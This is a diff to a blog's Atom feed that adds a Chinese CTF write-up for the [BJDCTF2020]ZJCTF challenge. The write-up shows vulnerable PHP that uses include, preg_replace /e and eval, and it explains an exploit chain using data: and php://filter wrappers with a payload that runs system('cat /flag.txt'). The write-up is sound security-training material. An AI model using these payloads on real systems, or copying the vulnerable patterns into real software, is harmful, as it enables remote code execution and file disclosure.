@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ev11ccaatt.github.io</id>
     <title>Gridea</title>
-    <updated>2021-03-21T01:19:48.181Z</updated>
+    <updated>2021-03-21T05:16:44.767Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ev11ccaatt.github.io"/>
     <link rel="self" href="https://ev11ccaatt.github.io/atom.xml"/>
@@ -11,12 +11,57 @@
     <icon>https://ev11ccaatt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Gridea</rights>
     <entry>
-        <title type="html"><![CDATA[3]]></title>
-        <id>https://ev11ccaatt.github.io/post/3</id>
-        <link href="https://ev11ccaatt.github.io/post/3">
+        <title type="html"><![CDATA[[BJDCTF2020]ZJCTF，不过如此]]></title>
+        <id>https://ev11ccaatt.github.io/post/bjdctf2020zjctfbu-guo-ru-ci</id>
+        <link href="https://ev11ccaatt.github.io/post/bjdctf2020zjctfbu-guo-ru-ci">
         </link>
-        <updated>2021-03-21T00:57:25.000Z</updated>
-        <content type="html"><![CDATA[<p>3</p>
+        <updated>2021-03-21T05:16:20.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>&lt;?php
+
+error_reporting(0);
+$text = $_GET[&quot;text&quot;];
+$file = $_GET[&quot;file&quot;];
+if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;I have a dream&quot;)){
+    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+    if(preg_match(&quot;/flag/&quot;,$file)){
+        die(&quot;Not now!&quot;);
+    }
+
+    include($file);  //next.php
+    
+}
+else{
+    highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<p>通过读入text和file来完成验证,由于对text采取的是file_get_contents,则需利用data:数据流封装器.</p>
+<p>无法直接读flag.php，但题目给了下一步的文件next.php。可用php://filter/convert.base64-encode/resource=next.php.</p>
+<p>读取解密后.</p>
+<pre><code>&lt;?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower(&quot;\\1&quot;)',
+        $str
+    );
+}
+
+
+foreach($_GET as $re =&gt; $str) {
+    echo complex($re, $str). &quot;\n&quot;;
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+
+</code></pre>
+<p>这里利用了preg_replace /e模式下的代码执行问题.([深入研究preg_replace与代码执行](<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a>))</p>
+<p>传入\S*=${getflag()}&amp;cmd=system('cat /flag.txt');(注意闭合)</p>
 ]]></content>
     </entry>
     <entry>
@@ -85,15 +130,6 @@ echo &quot;the flag is: &quot;.$flag;
 <pre><code>echo &quot;the flag is: &quot;.$flag;
 </code></pre>
 <p>最好绕过,但需要通过一个变量进行中转来绕过第2,3个if.</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[111]]></title>
-        <id>https://ev11ccaatt.github.io/post/111</id>
-        <link href="https://ev11ccaatt.github.io/post/111">
-        </link>
-        <updated>2021-03-19T14:40:37.000Z</updated>
-        <content type="html"><![CDATA[<p>111</p>
 ]]></content>
     </entry>
 </feed>
